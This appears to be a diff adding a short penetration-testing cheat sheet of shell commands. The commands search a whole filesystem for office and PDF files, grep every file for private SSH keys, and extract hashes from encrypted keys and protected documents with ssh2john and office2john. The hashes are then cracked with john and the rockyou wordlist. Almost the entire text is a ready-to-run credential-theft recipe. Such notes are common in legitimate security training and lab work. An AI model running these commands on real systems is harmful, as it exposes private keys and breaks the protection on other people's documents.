@@ -1,0 +1,30 @@
+# Hunting for encrypted files
+for ext in $(echo ".xls .xls* .xltx .od* .doc .doc* .pdf .pot .pot* .pp*");do echo -e "\nFile extension: " $ext; find / -name *$ext 2>/dev/null | grep -v "lib\|fonts\|share\|core" ;done
+
+-----------------------------------------------------------
+              Cracking encrypted SSH keys
+-----------------------------------------------------------
+# Hunting for SSH keys
+grep -rnE '^\-{5}BEGIN [A-Z0-9]+ PRIVATE KEY\-{5}$' /* 2>/dev/null
+
+# View key
+cat /home/user/.ssh/key_name.private
+
+# if this command asks for password the key is encrypted
+ssh-keygen -yf ~/.ssh/key_name
+
+# Export hash from key
+ssh2john.py key_name.private > ssh.hash
+
+# Crack the key with some regular ass john
+john --wordlist=/usr/share/wordlists/rockyou.txt ssh.hash
+
+-----------------------------------------------------------
+              Cracking protected documents
+-----------------------------------------------------------
+office2john.py my_protected_document.docs > protected-docx.hash
+john --wordlist=/usr/share/wordlists/rockyou.txt protected-docx.hash
+john protected-docx.hash --show
+
+# for pdf use: pdf2john.py
+
